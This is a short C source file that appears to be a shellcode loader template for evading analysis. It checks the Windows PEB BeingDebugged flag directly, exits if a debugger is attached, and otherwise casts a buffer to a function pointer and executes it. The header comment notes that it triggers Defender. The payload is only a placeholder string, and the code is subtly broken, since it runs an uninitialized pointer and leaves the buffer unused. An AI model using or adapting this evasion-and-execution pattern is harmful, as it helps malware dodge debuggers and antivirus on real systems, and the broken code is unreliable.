/*
Filename: underthemicroscope.c
Author: Daniel Sauder
Idea: https://www.youtube.com/watch?v=5cch_-3NVLk
Website: http://govolution.wordpress.com
License http://creativecommons.org/licenses/by-sa/3.0/

brings own PEV struc so that isDebuggerPresent does not have to be used
but: triggers defender
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <stdlib.h>
#include "myntdll.h"


BOOL UnderTheMicroscope() 
{
#ifdef _WIN64
  PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
  PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

  if (pPeb->BeingDebugged == 1)
    return TRUE;
  return FALSE;
}

void exec_shellcode(unsigned char *shellcode)
{
  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}



int main (int argc, char **argv)
{
	if (UnderTheMicroscope())
	{
	  printf("+ under the microscope\n");
	  return 0;
	}
	
	//unsigned char *buffer;
	unsigned char *shellcode;
	unsigned char buffer[]= "shellcode";

	int size = sizeof(buffer);

	exec_shellcode(shellcode);
}
